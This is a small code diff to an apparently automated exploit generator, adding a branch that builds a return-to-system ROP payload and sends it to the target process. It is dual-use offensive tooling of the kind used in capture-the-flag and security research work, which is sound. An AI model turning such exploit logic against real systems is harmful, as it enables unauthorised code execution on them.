@@ -105,6 +105,8 @@ def exploit(analyize, properties):
         payload = rop.ret2execve()
     elif properties["syscall"]:
         payload = rop.ret2syscall()
+    elif properties["system"]:
+        payload = rop.ret2system()
 
     if payload:
         p.sendline(payload)
